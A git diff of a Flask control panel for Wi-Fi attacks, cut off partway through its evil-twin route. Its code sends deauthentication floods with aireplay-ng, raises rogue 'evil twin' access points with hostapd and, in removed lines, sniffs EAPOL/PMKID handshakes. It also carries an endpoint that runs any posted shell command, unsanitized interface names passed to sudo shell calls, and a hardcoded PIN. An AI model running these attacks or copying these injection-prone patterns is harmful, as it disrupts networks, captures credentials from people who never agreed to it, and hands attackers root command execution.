@@ -1,19 +1,243 @@
-
-import subprocess, os, re
-from flask import Flask, jsonify, request, render_template, send_from_directory, abort
-import hashlib
-
+import subprocess
 import os
 import re
 import hashlib
-import subprocess
+import json
+import tempfile
+from flask import Flask, jsonify, request, render_template, send_from_directory, abort
 
 base_dir = os.path.abspath(os.path.dirname(__file__))
 template_dir = os.path.join(base_dir, 'templates')
 app = Flask(__name__, template_folder=template_dir)
 
 PIN_SHA256 = hashlib.sha256("062823".encode()).hexdigest()
+EVIL_TWIN_CONFIG = "evil_twin.conf"
 
+# --- Helper Functions (must be defined before use) ---
+def run_capture(cmd, timeout=10):
+    """Execute shell command and return structured result."""
+    try:
+        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
+        return {
+            'cmd': cmd,
+            'stdout': result.stdout.decode('utf-8', errors='replace'),
+            'stderr': result.stderr.decode('utf-8', errors='replace'),
+            'returncode': result.returncode,
+            'timeout': False
+        }
+    except subprocess.TimeoutExpired as e:
+        return {
+            'cmd': cmd,
+            'stdout': '',
+            'stderr': f'Timeout after {timeout}s',
+            'returncode': -1,
+            'timeout': True
+        }
+    except Exception as e:
+        return {
+            'cmd': cmd,
+            'stdout': '',
+            'stderr': str(e),
+            'returncode': -1,
+            'timeout': False
+        }
+
+def get_monitor_interface():
+    """Detect available monitor mode interface using aircrack-ng tools."""
+    try:
+        # Check for monitor interfaces
+        result = run_capture("iwconfig 2>/dev/null | grep -o '^[^ ]*' | grep mon", timeout=3)
+        interfaces = [i.strip() for i in result.get('stdout', '').split('\n') if i.strip()]
+        if interfaces:
+            return interfaces[0]
+        
+        # Try common monitor interface names
+        for iface in ['wlan0mon', 'wlan1mon', 'mon0', 'mon1']:
+            result = run_capture(f"iwconfig {iface} 2>/dev/null", timeout=2)
+            if result.get('returncode') == 0 and 'Mode:Monitor' in result.get('stdout', ''):
+                return iface
+        return None
+    except:
+        return None
+
+def get_interface_status(iface='wlan0'):
+    """Get detailed status of a network interface."""
+    status = {
+        'interface': iface,
+        'exists': False,
+        'up': False,
+        'mode': 'unknown',
+        'mac': None,
+        'ip': None,
+        'ssid': None,
+        'channel': None,
+        'frequency': None,
+        'signal': None
+    }
+    
+    try:
+        # Check if interface exists
+        result = run_capture(f"ip link show {iface} 2>/dev/null", timeout=2)
+        if result.get('returncode') != 0:
+            return status
+        
+        status['exists'] = True
+        
+        # Check if interface is up
+        if 'state UP' in result.get('stdout', ''):
+            status['up'] = True
+        
+        # Get MAC address
+        mac_match = re.search(r'link/ether\s+([0-9a-f:]+)', result.get('stdout', ''), re.I)
+        if mac_match:
+            status['mac'] = mac_match.group(1).upper()
+        
+        # Get IP address
+        result = run_capture(f"ip addr show {iface} 2>/dev/null | grep 'inet '", timeout=2)
+        if result.get('returncode') == 0:
+            ip_match = re.search(r'inet\s+([0-9.]+)', result.get('stdout', ''))
+            if ip_match:
+                status['ip'] = ip_match.group(1)
+        
+        # Get wireless info using iwconfig
+        result = run_capture(f"iwconfig {iface} 2>/dev/null", timeout=2)
+        if result.get('returncode') == 0:
+            output = result.get('stdout', '')
+            
+            # Check mode
+            if 'Mode:Monitor' in output:
+                status['mode'] = 'monitor'
+            elif 'Mode:Managed' in output:
+                status['mode'] = 'managed'
+            elif 'Mode:Master' in output:
+                status['mode'] = 'master'
+            
+            # Get SSID
+            ssid_match = re.search(r'ESSID:"([^"]+)"', output)
+            if ssid_match:
+                status['ssid'] = ssid_match.group(1)
+            
+            # Get channel/frequency
+            freq_match = re.search(r'Frequency:([0-9.]+)\s+GHz', output)
+            if freq_match:
+                status['frequency'] = freq_match.group(1) + ' GHz'
+            
+            chan_match = re.search(r'Channel\s+(\d+)', output)
+            if chan_match:
+                status['channel'] = chan_match.group(1)
+            
+            # Get signal strength
+            sig_match = re.search(r'Signal level=(-?\d+)', output)
+            if sig_match:
+                status['signal'] = sig_match.group(1) + ' dBm'
+        
+    except Exception as e:
+        status['error'] = str(e)
+    
+    return status
+
+def get_all_interfaces():
+    """Get status of all wireless interfaces."""
+    interfaces = {}
+    
+    # Check wlan0
+    interfaces['wlan0'] = get_interface_status('wlan0')
+    
+    # Check wlan1 if exists
+    result = run_capture("ip link show wlan1 2>/dev/null", timeout=2)
+    if result.get('returncode') == 0:
+        interfaces['wlan1'] = get_interface_status('wlan1')
+    
+    # Check monitor interfaces
+    mon_iface = get_monitor_interface()
+    if mon_iface:
+        interfaces[mon_iface] = get_interface_status(mon_iface)
+    
+    # Also check common monitor names
+    for mon_name in ['wlan0mon', 'wlan1mon', 'mon0', 'mon1']:
+        if mon_name not in interfaces:
+            result = run_capture(f"iwconfig {mon_name} 2>/dev/null", timeout=1)
+            if result.get('returncode') == 0:
+                interfaces[mon_name] = get_interface_status(mon_name)
+    
+    return interfaces
+
+def get_evil_twin_status():
+    """Check if evil twin AP is running."""
+    status = {
+        'running': False,
+        'interface': None,
+        'ssid': None,
+        'config_file': None,
+        'process': None
+    }
+    
+    try:
+        # Check if hostapd is running
+        result = run_capture("pgrep -f hostapd", timeout=2)
+        if result.get('returncode') == 0 and result.get('stdout', '').strip():
+            status['running'] = True
+            status['process'] = result.get('stdout', '').strip()
+        
+        # Check config file
+        config_path = os.path.join(base_dir, EVIL_TWIN_CONFIG)
+        if os.path.exists(config_path):
+            status['config_file'] = config_path
+            try:
+                with open(config_path, 'r') as f:
+                    content = f.read()
+                    ssid_match = re.search(r'ssid=([^\n]+)', content)
+                    if ssid_match:
+                        status['ssid'] = ssid_match.group(1).strip()
+                    if_match = re.search(r'interface=([^\n]+)', content)
+                    if if_match:
+                        status['interface'] = if_match.group(1).strip()
+            except:
+                pass
+        
+        # Check if interface is in master mode (AP mode)
+        if status['interface']:
+            iface_status = get_interface_status(status['interface'])
+            if iface_status.get('mode') == 'master':
+                status['running'] = True
+        
+    except Exception as e:
+        status['error'] = str(e)
+    
+    return status
+
+def parse_nmap_output(output):
+    """Parse nmap output into structured data."""
+    results = []
+    current_ip = None
+    current_ports = []
+    
+    for line in output.split('\n'):
+        line = line.strip()
+        if not line:
+            continue
+        
+        # Detect IP address line: "Nmap scan report for 192.168.1.1"
+        ip_match = re.search(r'for\s+([0-9.]+)', line)
+        if ip_match:
+            if current_ip and current_ports:
+                results.append({'ip': current_ip, 'ports': current_ports})
+            current_ip = ip_match.group(1)
+            current_ports = []
+        
+        # Detect open port line: "21/tcp   open   ftp"
+        port_match = re.match(r'(\d+)/tcp\s+open\s+(.+)', line)
+        if port_match:
+            port = port_match.group(1)
+            service = port_match.group(2).strip()
+            current_ports.append({'port': port, 'service': service})
+    
+    if current_ip and current_ports:
+        results.append({'ip': current_ip, 'ports': current_ports})
+    
+    return results
+
+# --- Authentication ---
 @app.route('/api/verify_pin', methods=['POST'])
 def api_verify_pin():
     try:
@@ -25,10 +249,11 @@ def api_verify_pin():
         if pin_hash == PIN_SHA256:
             return jsonify({"ok": True})
         else:
-            return jsonify({"ok": False, "error": "SHA256 PIN denied"})
+            return jsonify({"ok": False, "error": "Invalid PIN"})
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)})
 
+# --- Basic Routes ---
 @app.route('/')
 def home():
     return render_template('index.html')
@@ -53,288 +278,422 @@ def serve_page(filename):
         abort(404)
     return render_template(filename)
 
-# --- API: Run any shell command and return output ---
+# --- Command Execution ---
 @app.route('/api/run_command', methods=['POST'])
 def run_command():
-    data = request.get_json(force=True, silent=True) or {}
-    cmd = (data.get('cmd') or '').strip()
-    if not cmd:
-        return jsonify({'error': 'No command provided'}), 400
     try:
-        output = subprocess.check_output(cmd, shell=True, timeout=15).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
+        data = request.get_json(force=True, silent=True) or {}
+        cmd = (data.get('cmd') or '').strip()
+        if not cmd:
+            return jsonify({'error': 'No command provided'}), 400
+        
+        result = run_capture(cmd, timeout=15)
+        if result.get('timeout'):
+            return jsonify({'error': 'Command timed out', 'stderr': result.get('stderr')})
+        elif result.get('returncode') != 0:
+            return jsonify({'error': f"Command failed (exit {result.get('returncode')})", 'stderr': result.get('stderr'), 'stdout': result.get('stdout')})
+        else:
+            return jsonify({'output': result.get('stdout')})
     except Exception as e:
         return jsonify({'error': str(e)})
 
-# --- Example API routes for common commands ---
+# --- Network Information ---
 @app.route('/api/network_info')
 def network_info():
     try:
-        output = subprocess.check_output("hostname -I; ip route; hostname; nmcli -t -f active,ssid dev wifi; uptime", shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
+        info = {}
+        
+        # Get IP addresses
+        result = run_capture("hostname -I", timeout=3)
+        if result.get('returncode') == 0:
+            info['ip_addresses'] = result.get('stdout', '').strip().split()
+        
+        # Get routing table
+        result = run_capture("ip route", timeout=3)
+        if result.get('returncode') == 0:
+            info['routes'] = [line.strip() for line in result.get('stdout', '').split('\n') if line.strip()]
+        
+        # Get hostname
+        result = run_capture("hostname", timeout=2)
+        if result.get('returncode') == 0:
+            info['hostname'] = result.get('stdout', '').strip()
+        
+        # Get WiFi connection info
+        result = run_capture("nmcli -t -f active,ssid dev wifi 2>/dev/null | grep '^yes'", timeout=3)
+        if result.get('returncode') == 0:
+            wifi_info = result.get('stdout', '').strip()
+            if wifi_info:
+                parts = wifi_info.split(':')
+                info['wifi_connected'] = True
+                info['wifi_ssid'] = parts[1] if len(parts) > 1 else 'Unknown'
+            else:
+                info['wifi_connected'] = False
+        
+        # Get uptime
+        result = run_capture("uptime", timeout=2)
+        if result.get('returncode') == 0:
+            info['uptime'] = result.get('stdout', '').strip()
+        
+        return jsonify({'ok': True, 'info': info})
     except Exception as e:
         return jsonify({'error': str(e)})
 
 @app.route('/api/ping')
 def ping_host():
-    host = request.args.get("host", "8.8.8.8").strip()
-    if not re.match(r"^[a-zA-Z0-9.\-]+$", host) or len(host) > 64:
-        return jsonify({'error': 'Invalid host'})
     try:
-        output = subprocess.check_output(f"ping -c 3 -W 2 {host}", shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
+        host = request.args.get("host", "8.8.8.8").strip()
+        if not re.match(r"^[a-zA-Z0-9.\-]+$", host) or len(host) > 64:
+            return jsonify({'error': 'Invalid host'})
+        
+        result = run_capture(f"ping -c 3 -W 2 {host}", timeout=10)
+        if result.get('timeout'):
+            return jsonify({'error': 'Ping timed out'})
+        
+        output = result.get('stdout', '')
+        # Parse ping statistics
+        stats = {}
+        if 'packet loss' in output:
+            loss_match = re.search(r'(\d+)% packet loss', output)
+            if loss_match:
+                stats['packet_loss'] = loss_match.group(1) + '%'
+        
+        if 'min/avg/max' in output:
+            time_match = re.search(r'min/avg/max[^=]*=\s*([0-9.]+)/([0-9.]+)/([0-9.]+)', output)
+            if time_match:
+                stats['min_time'] = time_match.group(1) + 'ms'
+                stats['avg_time'] = time_match.group(2) + 'ms'
+                stats['max_time'] = time_match.group(3) + 'ms'
+        
+        return jsonify({'ok': True, 'output': output, 'stats': stats})
     except Exception as e:
         return jsonify({'error': str(e)})
 
 @app.route('/api/ping_gateway')
 def ping_gateway():
     try:
-        gw = subprocess.check_output("ip route | grep default | head -1", shell=True, timeout=5).decode('utf-8').strip()
-        if not gw or "via " not in gw:
-            return jsonify({'error': 'No default gateway'})
-        host = gw.split()[2]
+        # Get default gateway
+        result = run_capture("ip route | grep default | head -1", timeout=2)
+        if result.get('returncode') != 0 or not result.get('stdout'):
+            return jsonify(["ERROR: No default gateway found"])
+        
+        gw_line = result.get('stdout', '').strip()
+        if "via " not in gw_line:
+            return jsonify(["ERROR: Could not parse gateway"])
+        
+        host = gw_line.split()[2]
         if not re.match(r"^[a-zA-Z0-9.\-]+$", host):
-            return jsonify({'error': 'Invalid gateway'})
-        output = subprocess.check_output(f"ping -c 3 -W 2 {host}", shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-@app.route('/api/scan_wifi')
-def scan_wifi():
-    try:
-        output = subprocess.check_output("sudo nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list", shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-@app.route('/api/scan_wifi_list')
-def scan_wifi_list():
-    try:
-        output = subprocess.check_output("sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list", shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-@app.route('/api/deauth', methods=['POST'])
-def deauth():
-    try:
-        data = request.get_json(force=True, silent=True) or {}
-        bssid = (data.get("bssid") or "").strip().upper()
-        if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
-            return jsonify({'error': 'Invalid BSSID'})
-        output = subprocess.check_output(f"sudo aireplay-ng -0 5 -a {bssid} wlan0mon", shell=True, timeout=15).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-@app.route('/api/evil_twin', methods=['POST'])
-def evil_twin():
-    try:
-        data = request.get_json(force=True, silent=True) or {}
-        ssid = (data.get("ssid") or "").strip()[:32]
-        if not ssid:
-            return jsonify({'error': 'SSID required'})
-        config_path = os.path.join(base_dir, "evil_twin.conf")
-        config_body = f"""interface=wlan0\ndriver=nl80211\nssid={ssid}\nchannel=6\nhw_mode=g\n"""
-        with open(config_path, "w") as f:
-            f.write(config_body)
-        output = subprocess.check_output(f"sudo hostapd -d {config_path}", shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-# --- SNIFFER ROUTES (run command, return output) --- #
-@app.route('/api/sniffer/beacon', methods=['POST'])
-def sniffer_beacon():
-    cmd = "sudo tcpdump -i wlan0 type mgt subtype beacon -c 20 -vvv"
-    try:
-        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-@app.route('/api/sniffer/deauth', methods=['POST'])
-def sniffer_deauth():
-    cmd = "sudo tcpdump -i wlan0 type mgt subtype deauth -c 20 -vvv"
-    try:
-        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-@app.route('/api/sniffer/packet_count', methods=['POST'])
-def sniffer_packet_count():
-    cmd = "sudo tcpdump -i wlan0 -c 20 -vvv"
-    try:
-        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-@app.route('/api/sniffer/eapol_pmkid', methods=['POST'])
-def sniffer_eapol_pmkid():
-    cmd = "sudo tcpdump -i wlan0 ether proto 0x888e -c 20 -vvv"
-    try:
-        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-@app.route('/api/sniffer/packet_monitor', methods=['POST'])
-def sniffer_packet_monitor():
-    cmd = "sudo tcpdump -i wlan0 -c 20 -vvv"
-    try:
-        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-@app.route('/api/sniffer/channel_analyzer', methods=['POST'])
-def sniffer_channel_analyzer():
-    cmd = "sudo iwlist wlan0 channel"
-    try:
-        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-@app.route('/api/sniffer/raw_capture', methods=['POST'])
-def sniffer_raw_capture():
-    cmd = "sudo tcpdump -i wlan0 -c 20"
-    try:
-        output = subprocess.check_output(cmd, shell=True, timeout=10).decode('utf-8', errors='replace')
-        return jsonify({'output': output})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
-
-
-
-@app.route('/api/ping_gateway')
-def ping_gateway():
-    try:
-        gw = subprocess.check_output("ip route | grep default | head -1", shell=True, timeout=2).decode('utf-8').strip()
-        if not gw or "via " not in gw:
-            return jsonify(["ERROR: No default gateway"])
-        host = gw.split()[2]
-        if not re.match(r"^[a-zA-Z0-9.\-]+$", host):
-            return jsonify(["ERROR: Invalid gateway"])
-        out = subprocess.check_output(f"ping -c 3 -W 2 {host} 2>&1", shell=True, timeout=15).decode('utf-8', errors='replace')
-        return jsonify([f"Gateway: {host}"] + [line for line in out.split("\n") if line][:12])
-    except subprocess.TimeoutExpired:
-        return jsonify(["TIMEOUT: gateway"])
-    except Exception as e:
-        return jsonify([f"FAIL: {str(e)}"])
-
-# --- 1. CLEAN SSID SCANNER ---
-@app.route('/api/scan_wifi')
-def scan_wifi():
-    try:
-        cmd = "sudo nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list"
-        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
-        results = []
-        seen = set()
-        for line in output.split('\n'):
-            if not line: continue
-            parts = line.split(':')
-            if len(parts) >= 2:
-                ssid = parts[0]
-                if not ssid or ssid in seen: continue
-                seen.add(ssid)
-                security_field = parts[2] if len(parts) > 2 else ""
-                sec = "SECURE" if "WPA" in security_field or "RSN" in security_field else "OPEN"
-                results.append(f"{ssid[:12].ljust(12)} {parts[1]}% {sec}")
-        return jsonify(results[:15])
+            return jsonify(["ERROR: Invalid gateway address"])
+        
+        # Ping gateway
+        result = run_capture(f"ping -c 3 -W 2 {host} 2>&1", timeout=15)
+        if result.get('timeout'):
+            return jsonify(["TIMEOUT: Gateway ping timed out"])
+        
+        output = result.get('stdout', '')
+        lines = [f"Gateway: {host}"] + [line for line in output.split("\n") if line.strip()][:12]
+        return jsonify(lines)
     except Exception as e:
         return jsonify([f"ERROR: {str(e)}"])
 
-# BSSID regex: 6 hex octets with colons
+# --- WiFi Scanning (using nmcli) ---
+@app.route('/api/scan_wifi')
+def scan_wifi():
+    try:
+        result = run_capture("sudo nmcli -t -f SSID,SIGNAL,SECURITY dev wifi list", timeout=10)
+        if result.get('returncode') != 0:
+            return jsonify([f"ERROR: {result.get('stderr', 'WiFi scan failed')}"])
+        
+        output = result.get('stdout', '')
+        results = []
+        seen = set()
+        
+        for line in output.split('\n'):
+            if not line:
+                continue
+            parts = line.split(':')
+            if len(parts) >= 2:
+                ssid = parts[0]
+                if not ssid or ssid in seen:
+                    continue
+                seen.add(ssid)
+                signal = parts[1] if len(parts) > 1 else "0"
+                security_field = parts[2] if len(parts) > 2 else ""
+                sec = "SECURE" if ("WPA" in security_field or "RSN" in security_field) else "OPEN"
+                results.append(f"{ssid[:12].ljust(12)} {signal}% {sec}")
+        
+        return jsonify(results[:15] if results else ["No networks found"])
+    except Exception as e:
+        return jsonify([f"ERROR: {str(e)}"])
+
 _BSSID_RE = re.compile(r'(?:^|:)([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})(?=:|$|\s)')
 
-# --- SSID list with BSSID (for Evil Twin / Deauth selection 1–9) ---
 @app.route('/api/scan_wifi_list')
 def scan_wifi_list():
     try:
-        cmd = "sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list"
-        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
+        result = run_capture("sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list", timeout=10)
+        if result.get('returncode') != 0:
+            return jsonify({"error": result.get('stderr', 'WiFi scan failed')})
+        
+        output = result.get('stdout', '')
         results = []
         seen_ssid = set()
+        
         for line in output.split('\n'):
             if not line or len(results) >= 9:
                 continue
-            # Extract BSSID by regex (works even if SSID contains colons)
+            
+            # Extract BSSID using regex
             bssid_match = _BSSID_RE.search(line)
-            bssid = (bssid_match.group(1).upper() if bssid_match else "")
-            parts = line.split(':')
-            # SSID is first field; if we found BSSID, SSID is everything before it in the line
+            bssid = bssid_match.group(1).upper() if bssid_match else ""
+            
+            # Extract SSID (everything before BSSID)
             if bssid_match:
-                ssid = line[:bssid_match.start()].rstrip(':') or (parts[0] if parts else "")
+                ssid = line[:bssid_match.start()].rstrip(':')
             else:
+                parts = line.split(':')
                 ssid = parts[0] if parts else ""
+            
             if not ssid or ssid in seen_ssid:
                 continue
+            
             seen_ssid.add(ssid)
-            # Signal: last numeric field often; or parts after BSSID
+            
+            # Extract signal and channel
+            parts = line.split(':')
             signal = "0"
-            if len(parts) >= 8:
-                signal = parts[7] if parts[7].isdigit() else (parts[-1] if parts[-1].isdigit() else "0")
-            channel = parts[8] if len(parts) > 8 else "?"
+            channel = "?"
+            if len(parts) >= 3:
+                # Signal is usually after BSSID
+                for i, part in enumerate(parts):
+                    if part.isdigit() and int(part) <= 100:
+                        signal = part
+                        break
+                if len(parts) >= 4:
+                    channel = parts[-1] if parts[-1].isdigit() else "?"
+            
             results.append({"ssid": ssid, "bssid": bssid, "signal": signal, "channel": channel})
+        
         return jsonify(results)
     except Exception as e:
         return jsonify({"error": str(e)})
 
-# --- Debug: raw nmcli output (see exact format for BSSID parsing) ---
 @app.route('/api/scan_wifi_list_raw')
 def scan_wifi_list_raw():
     try:
-        cmd = "sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list"
-        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
-        lines = [line for line in output.split('\n') if line][:12]
+        result = run_capture("sudo nmcli -t -f SSID,BSSID,SIGNAL,CHAN dev wifi list", timeout=10)
+        if result.get('returncode') != 0:
+            return jsonify({"error": result.get('stderr', 'WiFi scan failed')})
+        
+        lines = [line for line in result.get('stdout', '').split('\n') if line.strip()][:12]
         return jsonify({"raw_lines": lines, "hint": "Each line is SSID:BSSID:SIGNAL:CHAN (BSSID has colons)"})
     except Exception as e:
         return jsonify({"error": str(e)})
 
-# --- Deauth: requires aircrack-ng, interface in monitor mode ---
+# --- Interface Management ---
+@app.route('/api/interfaces/status')
+def interfaces_status():
+    """Get status of all network interfaces."""
+    try:
+        interfaces = get_all_interfaces()
+        evil_twin = get_evil_twin_status()
+        return jsonify({
+            'ok': True,
+            'interfaces': interfaces,
+            'evil_twin': evil_twin
+        })
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+@app.route('/api/interfaces/<iface>/status')
+def interface_status(iface):
+    """Get status of a specific interface."""
+    try:
+        status = get_interface_status(iface)
+        return jsonify({'ok': True, 'status': status})
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+@app.route('/api/interfaces/evil_twin/status')
+def evil_twin_status():
+    """Get evil twin AP status."""
+    try:
+        status = get_evil_twin_status()
+        return jsonify({'ok': True, 'status': status})
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+@app.route('/api/interfaces/<iface>/monitor/start', methods=['POST'])
+def start_monitor_mode(iface):
+    """Put interface into monitor mode using airmon-ng."""
+    try:
+        # First check if interface exists
+        result = run_capture(f"ip link show {iface} 2>/dev/null", timeout=2)
+        if result.get('returncode') != 0:
+            return jsonify({'error': f'Interface {iface} not found'})
+        
+        # Stop NetworkManager on the interface
+        run_capture(f"sudo nmcli dev set {iface} managed no 2>&1", timeout=3)
+        
+        # Bring interface down
+        run_capture(f"sudo ip link set {iface} down 2>&1", timeout=2)
+        
+        # Start monitor mode using airmon-ng
+        cmd = f"sudo airmon-ng start {iface} 2>&1"
+        result = run_capture(cmd, timeout=10)
+        
+        if result.get('returncode') == 0:
+            # Find the monitor interface name
+            output = result.get('stdout', '')
+            mon_match = re.search(r'monitor mode enabled on\s+(\w+)', output, re.I)
+            if mon_match:
+                mon_iface = mon_match.group(1)
+            else:
+                # Try to detect it
+                mon_iface = get_monitor_interface()
+            
+            return jsonify({
+                'ok': True,
+                'msg': f'Monitor mode started on {iface}',
+                'monitor_interface': mon_iface,
+                'output': output[:500]
+            })
+        else:
+            return jsonify({
+                'error': 'Failed to start monitor mode',
+                'stderr': result.get('stderr', ''),
+                'stdout': result.get('stdout', '')
+            })
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+@app.route('/api/interfaces/<iface>/monitor/stop', methods=['POST'])
+def stop_monitor_mode(iface):
+    """Stop monitor mode and return interface to managed mode."""
+    try:
+        # Stop monitor mode using airmon-ng
+        cmd = f"sudo airmon-ng stop {iface} 2>&1"
+        result = run_capture(cmd, timeout=10)
+        
+        # Get the base interface name (remove 'mon' suffix)
+        base_iface = iface.replace('mon', '')
+        
+        # Re-enable NetworkManager
+        run_capture(f"sudo nmcli dev set {base_iface} managed yes 2>&1", timeout=3)
+        
+        # Bring interface up
+        run_capture(f"sudo ip link set {base_iface} up 2>&1", timeout=2)
+        
+        if result.get('returncode') == 0:
+            return jsonify({
+                'ok': True,
+                'msg': f'Monitor mode stopped, {base_iface} returned to managed mode',
+                'output': result.get('stdout', '')[:500]
+            })
+        else:
+            return jsonify({
+                'error': 'Failed to stop monitor mode',
+                'stderr': result.get('stderr', ''),
+                'stdout': result.get('stdout', '')
+            })
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+@app.route('/api/interfaces/<iface>/up', methods=['POST'])
+def interface_up(iface):
+    """Bring interface up."""
+    try:
+        result = run_capture(f"sudo ip link set {iface} up 2>&1", timeout=5)
+        if result.get('returncode') == 0:
+            status = get_interface_status(iface)
+            return jsonify({
+                'ok': True,
+                'msg': f'Interface {iface} brought up',
+                'status': status
+            })
+        else:
+            return jsonify({
+                'error': f'Failed to bring {iface} up',
+                'stderr': result.get('stderr', '')
+            })
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+@app.route('/api/interfaces/<iface>/down', methods=['POST'])
+def interface_down(iface):
+    """Bring interface down."""
+    try:
+        result = run_capture(f"sudo ip link set {iface} down 2>&1", timeout=5)
+        if result.get('returncode') == 0:
+            status = get_interface_status(iface)
+            return jsonify({
+                'ok': True,
+                'msg': f'Interface {iface} brought down',
+                'status': status
+            })
+        else:
+            return jsonify({
+                'error': f'Failed to bring {iface} down',
+                'stderr': result.get('stderr', '')
+            })
+    except Exception as e:
+        return jsonify({'error': str(e)})
+
+# --- WiFi Attacks (using aircrack-ng suite) ---
 @app.route('/api/deauth', methods=['POST'])
 def deauth():
     try:
         data = request.get_json(force=True, silent=True) or {}
         bssid = (data.get("bssid") or "").strip().upper()
-        debug = {"received": bssid, "length": len(bssid)}
+        
         if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
-            return jsonify({"error": "Invalid BSSID", "debug": debug, "hint": "Use format AA:BB:CC:DD:EE:FF"})
-        for iface in ["wlan0mon", "wlan1mon", "wlan0", "wlan1"]:
-            try:
-                out = subprocess.check_output(f"sudo aireplay-ng -0 5 -a {bssid} {iface} 2>&1", shell=True, timeout=15).decode('utf-8', errors='replace')
-                return jsonify({"ok": True, "msg": f"Deauth sent on {iface}", "log": out[:500], "debug": debug})
-            except Exception as e:
-                debug["last_error"] = str(e)
-                continue
-        return jsonify({"error": "aireplay-ng failed (try monitor mode: airmon-ng start wlan0)", "debug": debug})
+            return jsonify({"error": "Invalid BSSID format. Use AA:BB:CC:DD:EE:FF"})
+        
+        # Find monitor interface
+        mon_iface = get_monitor_interface()
+        if not mon_iface:
+            # Try to start monitor mode
+            result = run_capture("sudo airmon-ng start wlan0 2>&1", timeout=5)
+            mon_iface = get_monitor_interface()
+            if not mon_iface:
+                return jsonify({"error": "No monitor interface available. Try: sudo airmon-ng start wlan0"})
+        
+        # Send deauth packets using aireplay-ng
+        cmd = f"sudo aireplay-ng -0 5 -a {bssid} {mon_iface}"
+        result = run_capture(cmd, timeout=15)
+        
+        if result.get('returncode') == 0:
+            return jsonify({
+                "ok": True,
+                "msg": f"Deauth packets sent to {bssid}",
+                "interface": mon_iface,
+                "output": result.get('stdout', '')[:500]
+            })
+        else:
+            return jsonify({
+                "error": "Deauth failed",
+                "stderr": result.get('stderr', ''),
+                "hint": f"Interface {mon_iface} may not be in monitor mode"
+            })
     except Exception as e:
-        return jsonify({"error": str(e), "debug": {"exception": str(e)}})
+        return jsonify({"error": str(e)})
 
-# --- Evil Twin: write hostapd config, run hostapd -d, return command + output ---
-EVIL_TWIN_CONFIG = "evil_twin.conf"
-
+# --- Evil Twin AP (using hostapd) ---
 @app.route('/api/evil_twin', methods=['POST'])
 def evil_twin():
     try:
         data = request.get_json(force=True, silent=True) or {}
         ssid = (data.get("ssid") or "").strip()[:32]
-        debug = {"received_ssid": ssid, "length": len(ssid)}
+        
         if not ssid:
-            return jsonify({"error": "SSID required", "debug": debug})
+            return jsonify({"error": "SSID required"})
         if not re.match(r"^[ -~]+$", ssid):
-            return jsonify({"error": "Invalid SSID", "debug": debug})
-
+            return jsonify({"error": "Invalid SSID characters"})
+        
         config_path = os.path.join(base_dir, EVIL_TWIN_CONFIG)
-        # Minimal hostapd config (escape SSID: no newlines)
         ssid_safe = ssid.replace("\n", "").replace("\r", "")
-        config_body = f"""# Evil Twin - generated for SSID: {ssid_safe}
-interface=wlan0
+        
+        # Create hostapd config
+        config_body = f"""interface=wlan0
 driver=nl80211
 ssid={ssid_safe}
 channel=6
@@ -344,87 +703,249 @@ hw_mode=g
             with open(config_path, "w") as f:
                 f.write(config_body)
         except Exception as e:
-            return jsonify({"error": f"Could not write config: {e}", "debug": debug})
-
-        # Run hostapd in debug mode (-d) so you see full startup/output; timeout after 8s
+            return jsonify({"error": f"Could not write config: {e}"})
+        
+        # Run hostapd in debug mode
         cmd = f"sudo hostapd -d {config_path} 2>&1"
-        run_result = run_capture(cmd, timeout=8)
-        debug["config_path"] = str(config_path)
-        debug["config_preview"] = config_body.strip()[:500]
-        debug["hostapd"] = {k: str(v) if k in ("cmd", "stdout", "stderr") else v for k, v in run_result.items()}
-
